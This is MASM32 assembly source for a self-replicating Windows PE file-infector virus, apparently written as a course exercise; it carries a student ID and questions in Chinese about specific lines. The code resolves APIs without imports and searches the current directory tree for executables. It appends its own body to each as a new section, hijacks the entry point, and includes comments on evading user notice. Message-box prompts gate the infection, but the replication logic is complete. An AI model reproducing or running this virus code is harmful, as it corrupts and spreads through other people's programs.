.586
.model flat, stdcall
option casemap :none   ; case sensitive
include c:\masm32\include\windows.inc 
include c:\masm32\include\comctl32.inc 
includelib c:\masm32\lib\comctl32.lib 
;----------------------------------------------------------------------------------------------------
;main function
;----------------------------------------------------------------------------------------------------
.code
VCode:
	dwVLen						dd	?
	k32Base						dd	?  
	u32Base						dd	?
	szIS						db	"IS ,U202112151 杜宇晗",0									
	szMsg1						db	"重定位完毕，并获得所有API地址！"
	szMsg2						db	"是否观看病毒感染过程？",0
	szMsg10						db	"感染过程开始...",0
	szMsg3						db	"开始查找本路径下所有符合感染条件的文件",0
	szMsg4						db	"找到如下可执行文件,开始对该文件进行检查...",0
	szMsg5						db	"该文件是一个合法的PE文件,并且没有被感染过,开始感染...",0
	szMsg6						db	"对该文件处理完毕！感染结束，文件增加4k，修改了一些文件头。给文件增加字节的操作完毕后即被杀毒软件查出",0
	szMsg7						db	"是否继续观看对其它的文件的感染过程?",0
	szMsg8						db	"该路径下相关程序感染完毕或者用户取消了操作,开始运行主程序",0
	szMsg9						db	"由于某种原因不能进行本文件的感染,很大可能是文件已经被感染或者不是合法的EXE文件,对于已感染的文件不再进行感染，是为了防止多次感染使文件增大而引起用户的察觉",0
	szMsg0						db	"此处可以让我们的病毒sleep一下,避免硬盘的高速运转,而让用户察觉",0

	hEvent						dd	?
	dwNoUse						dd	?
	
	
	szFilterFst					db	"*.*",0
	szFilterSnd					db	"EXEDLLCRT",0
	szCurrentExt				db	4 dup(?),0
	
	szDIRBuffer					db	MAX_PATH	dup	(0),0	;to hold current dir
	
	bCancel						dd	?

	hFile						dd	?
	hFileMap					dd	?
	lpMemory					dd	?
	lpNtHeader					dd	?
	dwFileSize					dd	?
	dwOldEip					dd	?
	dwOldEnd					dd	?
	dwNewEip					dd	?
;----------------------------------------------------------------------------------------------------
;all api address and name should be defined here
;----------------------------------------------------------------------------------------------------
	szDllKernel					db	"Kernel32.dll",0
	szDllUsr					db	"User32.dll",0
	
	szGetProcAddress			db	"GetProcAddress",0
	lpGetProcAddress			dd	?
	szLoadLibrary				db	"LoadLibraryA",0
	lpLoadLibrary				dd	?	
		
szKer32Name:
	szGetModuleHandle			db	"GetModuleHandleA",0
	szGetVersion				db	"GetVersion",0
	szCloseHandle				db	"CloseHandle",0
	szlstrcpyA					db	"lstrcpyA",0
	szlstrlenA					db	"lstrlenA",0
	szlstrcatA					db	"lstrcatA",0
	szFindFirstFileA			db	"FindFirstFileA",0
	szFindClose					db	"FindClose",0
	szFindNextFileA				db	"FindNextFileA",0
	szCreateFileA				db	"CreateFileA",0
	szGetFileSize				db	"GetFileSize",0
	szCreateFileMappingA		db	"CreateFileMappingA",0
	szMapViewOfFile				db	"MapViewOfFile",0
	szSetFilePointer			db	"SetFilePointer",0
	szSetEndOfFile				db	"SetEndOfFile",0
	szUnmapViewOfFile			db	"UnmapViewOfFile",0
	szSleep 					db	"Sleep",0
	szCreateThread				db	"CreateThread",0
	szCreateEventA				db	"CreateEventA",0
	szOpenEventA				db	"OpenEventA",0
	szGetCurrentDirectoryA		db	"GetCurrentDirectoryA",0

	Ker32End					db	0
lpKer32:
	lpGetModuleHandle			dd	?
	lpGetVersion				dd	?	
	lpCloseHandle				dd	?
	lplstrcpyA					dd	?
	lplstrlenA					dd	?
	lplstrcatA					dd	?
	lpFindFirstFileA			dd	?
	lpFindClose					dd	?
	lpFindNextFileA				dd	?
	lpCreateFileA				dd	?
	lpGetFileSize				dd	?
	lpCreateFileMappingA		dd	?
	lpMapViewOfFile				dd	?
	lpSetFilePointer			dd	?
	lpSetEndOfFile				dd	?
	lpUnmapViewOfFile			dd	?
	lpSleep 					dd	?
	lpCreateThread				dd	?
	lpCreateEventA				dd	?
	lpOpenEventA				dd	?
	lpGetCurrentDirectoryA		dd	?

szUsr32Name:
	szMessageBox				db	"MessageBoxA",0						;for debug
	Usr32End					db	0	
lpUsr32:
	lpMessageBox				dd	?	
;--------------------------------------------------------------------------------------------------
;code start
;--------------------------------------------------------------------------------------------------
SingleTest	proc	szMsg							;for debug
	pushad
	
	push	0h
	lea		eax,[ebx+offset szIS]
	push	eax
	mov		eax,szMsg
	push 	eax
	push	0h
	call	[ebx+lpMessageBox]	
	
	popad
	ret

SingleTest endp
Relocate	proc
    call first
first:
    pop ebx
    sub ebx ,offset first
	ret
Relocate	endp

SEHHandler	proc	lpExceptionRecord,lpSEH,lpContext,lpDispatcherContext
	pushad
	mov		esi,lpExceptionRecord
	mov		edi,lpContext
	assume	esi:ptr EXCEPTION_RECORD,edi:ptr CONTEXT
	mov		eax,lpSEH
	push	[eax + 0ch]
	pop		[edi].regEbp
	push	[eax + 8]
	pop		[edi].regEip
	push	eax
	pop		[edi].regEsp
	assume	esi:nothing,edi:nothing
	popad
	mov		eax,ExceptionContinueExecution
	ret
SEHHandler	endp

GetKernelBase	proc	dwKernelRet
	LOCAL	dwReturn
	pushad

	call	Relocate
		
	assume	fs:nothing
	push	ebp
	lea		eax,[ebx + offset PageError]
	push	eax
	lea		eax,[ebx + offset SEHHandler]
	push	eax
	push	fs:[0]
	mov		fs:[0],esp	
	mov		edi,dwKernelRet
	and		edi,0ffff0000h  ;问题3：次语句功能是？
@@:
	cmp		word ptr [edi],IMAGE_DOS_SIGNATURE;问题4：解释语句174-193的功能
	jne		PageError
	mov		esi,edi
	add		esi,[esi+003ch]
	cmp		word ptr [esi],IMAGE_NT_SIGNATURE
	jne		PageError
	mov		dwReturn,edi
	jmp		@f
PageError:
	sub		edi,010000h
	cmp		edi,070000000h
	jb		@f
	jmp		@b
@@:
	pop		fs:[0]
	add		esp,0ch
	popad
	mov		eax,dwReturn
	ret
GetKernelBase	endp

GetApi		proc	hModule,lpszApi
	local	dwReturn,dwStringLength

	pushad
	mov		dwReturn,0

	call	Relocate
				
	assume	fs:nothing
	push	ebp
	lea		eax,[ebx + offset Error]
	push	eax
	lea		eax,[ebx + offset SEHHandler]
	push	eax
	push	fs:[0]
	mov		fs:[0],esp		
		
	mov		edi,lpszApi
	mov		ecx,-1
	xor		al,al
	cld
	repnz	scasb
	mov		ecx,edi
	sub		ecx,lpszApi
	mov		dwStringLength,ecx		
		
	mov		esi,hModule
	add		esi,[esi + 3ch]
	assume	esi:ptr IMAGE_NT_HEADERS
	mov		esi,[esi].OptionalHeader.DataDirectory.VirtualAddress
	add		esi,hModule
	assume	esi:ptr IMAGE_EXPORT_DIRECTORY		


	mov		ebx,[esi].AddressOfNames
	add		ebx,hModule
	xor		edx,edx
@@:	
	push	esi
	mov		edi,[ebx]
	add		edi,hModule
	mov		esi,lpszApi
	mov		ecx,dwStringLength
	repz	cmpsb
	jnz		skip	
	pop		esi
	jmp		@f
skip:
	pop		esi
	add		ebx,4
	inc		edx
	cmp		edx,[esi].NumberOfNames
	jl		@b
	jmp		Error
@@:
	sub		ebx,[esi].AddressOfNames
	sub		ebx,hModule
	shr		ebx,1
	add		ebx,[esi].AddressOfNameOrdinals
	add		ebx,hModule
	movzx	eax,word ptr [ebx]

		
	shl		eax,2
	add		eax,[esi].AddressOfFunctions
	add		eax,hModule
		
	mov		eax,[eax]
	add		eax,hModule
	mov		dwReturn,eax
Error:
	pop		fs:[0]
	add		esp,0ch
	assume	esi:nothing
	popad
	mov		eax,dwReturn
	ret

GetApi		endp		
		
GetGrpApi	proc	ApiName:dword,ApiAddress:dword,DllBase:dword
	call	Relocate

	mov		esi,ApiName
	mov		edi,DllBase
	mov		edx,ApiAddress
@@:		
	push	edx
	mov		al,[esi]
	or		al,al
	jz		@f		
	push	esi	
	push	edi
		
	call	[ebx+lpGetProcAddress]

	or		eax,eax
	jz		@f
	pop		edx
	mov		[edx],eax
	add		edx,4
		
ld:
	lodsb
	or		al,al
	jz		@b
	loop	ld
		
@@:		
	ret

GetGrpApi endp

AlignFunc	proc	dwSize:dword,dwAlign:dword			;make the section to be aligned,this function is very well
	push	edx
	mov		eax,dwSize
	xor		edx,edx
	div		dwAlign
	or		edx,edx
	jz		@f
	inc		eax
@@:	
	mul		dwAlign
	pop		edx

	ret

AlignFunc	endp

ProcessFile	proc	File:dword
	call	Relocate
	
	pushad
	push	[ebx+dwOldEip]

	push	0h			;NULL
	push	00000020h	;FILE_ATTRIBUTE_ARCHIVE
	push	3h			;OPEN_EXISTING
	push	0h			;NULL
	push	1h+2h		;FILE_SHARE_READ or FILE_SHARE_WRITE
	push	80000000h+40000000h	;GENERIC_READ or GENERIC_WRITE
	push	File
	call	[ebx+lpCreateFileA]
	
	cmp		eax,-1									;-1 is invalid
	je		RT
	mov		[ebx+hFile],eax	

	push	0
	push	eax
	call	[ebx+lpGetFileSize]

	cmp		eax,-1
	je		CloseFile
	mov		[ebx+dwFileSize],eax
	add		eax,1000h
	
	push	0		;null
	push	eax
	push	0
	push	4h		;PAGE_READWRITE
	push	0
	push	[ebx+hFile]
	call	[ebx+lpCreateFileMappingA]
	or 		eax,eax
	jz		CloseFile
	mov		[ebx+hFileMap],eax	
	
	push	0	;null
	push	0
	push	0
	push	2h+4h		;FILE_MAP_READ or FILE_MAP_WRITE
	push	eax
	call	[ebx+lpMapViewOfFile]
	
	or		eax,eax									
	jz		CloseFileMap							
	mov		[ebx+lpMemory],eax
		
	mov 	esi,eax
	cmp		word ptr[esi],'ZM'
	jne 	@f
	
	add		esi,[esi+3ch]
	cmp		word ptr[esi],'EP'						;PE tag
	jne		@f
	
	cmp		word ptr[esi+4],014ch					;machine->intel
	jne		@f

	test	word ptr[esi+16h],2000h					;only infect .exe file now
	jnz		@f
	

	mov		ecx,[esi+74h]							;
	imul	ecx,ecx,8	
	
	lea		eax,[ecx+esi+78h]
	movzx	ecx,word ptr[esi+6h]
	imul	ecx,ecx,28h
	add		eax,ecx
		
	sub		eax,28h								;to judge whether the file has been infected
	cmp		dword ptr[eax],'SI'
	je		@f	
		
	lea		edx,[ebx+szMsg5]
	push	edx
	call	SingleTest
			
	mov		cx,word ptr[esi+6h]	
	inc		cx										;increase the number of section
	mov		[esi+6h],cx
	
	mov		[ebx+lpNtHeader],esi
	mov		esi,eax
	
	add		esi,28h
	
	mov		dword ptr[esi],'SI'				;this mark is also used to judge wether the file has been infected
	mov		eax,[ebx+dwVLen]
	mov		dword ptr[esi+8h],eax

	mov		edx,[ebx+lpNtHeader]
	mov		ecx,[edx+38h]						;section alignment
	mov		eax,[esi-28h+8h]					;previous section len
	push	ecx
	push	eax
	call	AlignFunc	

	mov		ecx,[esi-28h+0ch]
	add		eax,ecx

	mov		[esi+0ch],eax	

	add		eax,[offset VCodeStart-offset VCode]
	mov		[ebx+dwNewEip],eax			
	
	mov		dword ptr[esi+24h],0e0000020h
		
	mov		edx,[ebx+lpNtHeader]
	mov		edi,[edx+3ch]					;file alignment
	mov		eax,[ebx+dwVLen]
	push	edi
	push	eax
	call	AlignFunc

	mov		[esi+10h],eax	
	
	mov		eax,[esi-28h+14h]						
	add		eax,[esi-28h+10h]
	mov		[esi+14h],eax
	
	mov		[ebx+dwOldEnd],eax
	
	mov		eax,[ebx+lpNtHeader]
	
	mov		edx,[eax+28h]
	
	mov		[ebx+dwOldEip],edx				;->old entrance

	mov		edx,[ebx+dwNewEip]
	mov		[eax+28h],edx
		
	mov		edx,[eax+38h]
	mov		ecx,[eax+50h]
	add		ecx,[ebx+dwVLen]
	push	edx
	push	ecx
	call	AlignFunc
	
	mov		edx,[ebx+lpNtHeader]			;increase num of section should be start here
	mov		[edx+50h],eax
	
	mov		eax,[edx+38h]
	mov		ecx,[ebx+dwVLen]
	push	eax
	push	ecx
	call	AlignFunc

	add		[edx+1ch],eax

	mov		ecx,[ebx+dwVLen]
	mov		edi,[ebx+dwOldEnd]
	add		edi,[ebx+lpMemory]									;add code to here
	lea		esi,[ebx+VCode]						
	rep		movsb
	
	xor		eax,eax
	sub		edi,[ebx+lpMemory]
	
	push	eax		;FILE-BEGIN
	push	eax
	push	edi
	push	[ebx+hFile]
	call	[ebx+lpSetFilePointer]
	
	push	[ebx+hFile]
	call	[ebx+lpSetEndOfFile]
	jmp		SecurityExt
@@:	
	lea 	eax,[ebx+szMsg9]
	push	eax
	call	SingleTest	
SecurityExt:
	push	[ebx+lpMemory]
	call	[ebx+lpUnmapViewOfFile]
CloseFileMap:	
	push	[ebx+hFileMap]
	call	[ebx+lpCloseHandle]
CloseFile:	
	push	[ebx+hFile]
	call	[ebx+lpCloseHandle]
	
	lea		eax,[ebx+szMsg6]
	push	eax
	call	SingleTest
	
RT:
	pop	[ebx+dwOldEip]
	popad
	ret
ProcessFile endp

SearchPe	proc	Drive
	LOCAL	stFindFile:WIN32_FIND_DATA
	LOCAL	hFindFile
	LOCAL	szPath[MAX_PATH]:byte
	LOCAL	szSearch[MAX_PATH]:byte
	LOCAL	szFindFile[MAX_PATH]:byte

	pushad
	call	Relocate

	mov		eax,Drive
	push	eax
	lea		eax,szPath
	push	eax
	call	[ebx+lplstrcpyA]
	
@@:
	lea		eax,szPath
	push	eax
	call	[ebx+lplstrlenA]
	
	lea		esi,szPath
	add		esi,eax
	xor		eax,eax
	mov		al,'\'
	cmp		byte ptr[esi-1],al
	je		NotAdd
	mov		word ptr[esi],ax
NotAdd:
	lea		eax,szPath
	push	eax
	lea		eax,szSearch
	push	eax
	call	[ebx+lplstrcpyA]

	lea		eax,[ebx+offset szFilterFst]
	push	eax
	lea		eax,szSearch
	push	eax
	call	[ebx+lplstrcatA]
	
	lea		eax,stFindFile
	push	eax
	lea		eax,szSearch
	push	eax
	call	[ebx+lpFindFirstFileA]

	cmp		eax,-1				;INVALID_HANDLE_VALUE
	je		ED
	
	mov		hFindFile,eax
loop1:
	lea		eax,szPath
	push	eax
	lea		eax,szFindFile
	push	eax
	call	[ebx+lplstrcpyA]
	
	lea		eax,stFindFile.cFileName
	push	eax
	lea		eax,szFindFile
	push	eax
	call	[ebx+lplstrcatA]
	
	cmp		stFindFile.dwFileAttributes,10h		;FILE_ATTRIBUTE_DIRECTORY
	jne		file
	cmp		stFindFile.cFileName,'.'
	je		file
	lea		eax,szFindFile
	push	eax
	call	SearchPe

	cmp	[ebx+bCancel],1
	je	ED
file:			
	cmp		stFindFile.dwFileAttributes,800h		;FILE_ATTRIBUTE_COMPRESSED
	je		next
	cmp		stFindFile.dwFileAttributes,00000004h 	;FILE_ATTRIBUTE_SYSTEM
	je		next
	
	mov		ecx,3h
@@:	
	lea		esi,stFindFile.cFileName
	push	ecx
 	lea		eax,stFindFile.cFileName
 	push	eax
 	call	[ebx+lplstrlenA]
	pop		ecx
 	sub		eax ,3h
 	add		esi,eax
 	lea		edi,[ebx+offset szCurrentExt]
 	push	ecx
	mov		ecx,3h
nextC:
	mov		al,byte ptr[esi]
	cmp		al,'a'
	jb		loop2
	cmp		al,'z'
	ja		loop2
	sub		al,20h
loop2:
	stosb
	inc		esi
	loop	nextC
	pop		ecx
					
	lea		esi,[ebx+offset szCurrentExt]
 	lea		edi,[ebx+offset szFilterSnd]

	mov		eax,3h
 	sub		eax,ecx
 	mov		edx,3h
 	mul		edx
 	add		edi,eax
 	push	ecx
 	mov		ecx,4h
 	repz	cmpsb
 	or		ecx,0
 	jz		@f
 	pop		ecx
 	loop	@b
 	jmp		next	
@@:	 
	pop		ecx	

	push	0h
	lea		eax,[ebx+offset szMsg4]
	push	eax
	lea		eax,szFindFile
	push	eax
	push	0h
	call	[ebx+lpMessageBox]	

	lea		eax,szFindFile	
	push	eax				
	call	ProcessFile
	
	push	10h
	call	[ebx+lpSleep]	;sleep for a while

	lea		eax,[ebx+szMsg0]
	push	eax
	call	SingleTest

	push	MB_YESNO or MB_ICONQUESTION
	lea		eax,[ebx+szIS]
	push	eax
	lea		eax,[ebx+szMsg7]
	push	eax
	push	NULL
	call	[ebx+lpMessageBox]	
	
	.if		eax!=IDYES
		mov	[ebx+bCancel],1
		jmp	ED
	.endif
		
next:			
	lea		eax,stFindFile
	push	eax
	push	hFindFile
	call	[ebx+lpFindNextFileA]

	cmp		eax,0		;FALSE
	je		@f
	jmp		loop1
@@:

	push	hFindFile
	call	[ebx+lpFindClose]
ED:
	popad
	ret
SearchPe endp


VThread			proc
	call	Relocate
	lea		eax,[ebx+szDIRBuffer]
	push	eax
	push	MAX_PATH
	
	call	[ebx+lpGetCurrentDirectoryA]
	
	lea		eax,[ebx+szMsg3]
	push	eax
	call	SingleTest
	
	lea		eax,[ebx+szDIRBuffer]
	push	eax								;here only deal with the path under a drive.more things need to be done 

	call	SearchPe

	ret

VThread endp

_start:
	invoke	InitCommonControls
VCodeStart:
	call	Relocate
	mov		eax,[offset VCodeEnd-offset VCode]
	mov		[ebx+dwVLen],eax
	mov		[ebx+bCancel],0
		
	push	[esp]  ;问题2：此语句功能是？
	call	GetKernelBase
	mov		[ebx+offset k32Base],eax

	lea		esi,[ebx+offset szGetProcAddress]
	mov		edi,[ebx+offset k32Base]
	push	esi
	push	edi
	call	GetApi
	mov		[ebx+lpGetProcAddress],eax
				
	lea		esi,[ebx+offset szLoadLibrary]
	mov		edi,[ebx+offset k32Base]
	push	esi
	push	edi
	call	GetApi
	mov		[ebx+lpLoadLibrary],eax
		
	lea		esi,[ebx+offset szDllKernel]
	push	esi
	call	[ebx+lpLoadLibrary]
	mov		[ebx+offset k32Base],eax

	lea		esi,[ebx+offset szDllUsr]
	push	esi
	call	[ebx+lpLoadLibrary]
	mov		[ebx+offset u32Base],eax
				
	lea		esi,[ebx+offset lpKer32]
	lea		edi,[ebx+offset szKer32Name]
	mov		eax,[ebx+k32Base]
	push	eax
	push	esi
	push	edi
	call	GetGrpApi

	lea		esi,[ebx+offset lpUsr32]
	lea		edi,[ebx+offset szUsr32Name]
	mov		eax,[ebx+u32Base]
	push	eax
	push	esi
	push	edi
	call	GetGrpApi

	lea		eax,[ebx+offset szMsg1]		
	push	eax	
	call	SingleTest
	
		
	lea		eax,[ebx+offset szIS]
	push	eax	
	push	0							;inherit flag
	push	EVENT_ALL_ACCESS
	
	call	[ebx+lpOpenEventA]
	
	or		eax,eax
	jnz		CHandle
	
	lea		eax,[ebx+offset szIS]
	push	eax
	push	1							;true
	push	0							;no matter true or false
	push	0							;null	
	call	[ebx+lpCreateEventA]		;create the mutex
	
	push	MB_YESNO or MB_ICONQUESTION
	lea		eax,[ebx+szIS]
	push	eax
	lea		eax,[ebx+szMsg2]
	push	eax
	push	NULL
	call	[ebx+lpMessageBox]	
	
	.if		eax!=IDYES
		jmp	RT1
	.endif

	lea		eax,[ebx+szMsg10]
	push	eax
	call	SingleTest
	
	call	VThread				;in order to test out virus.we set comment here
	
;	mov		eax,[ebx+dwNoUse]
;	push	eax	
;	push	0
;	push	NULL
;	lea		eax,[ebx+offset VThread]
;	push	eax
;	push	0
;	push	NULL
;	call	[ebx+lpCreateThread]

	
	lea		eax,[ebx+szMsg8]
	push	eax
	call	SingleTest
	jmp		RT1

CHandle:
	push	eax
	call	[ebx+lpCloseHandle]
	
RT1:
	xor		eax,eax
	push	eax
	call	[ebx+lpGetModuleHandle]
	
	add		eax,[ebx+dwOldEip]
	jmp		eax
VCodeEnd:

end	_start
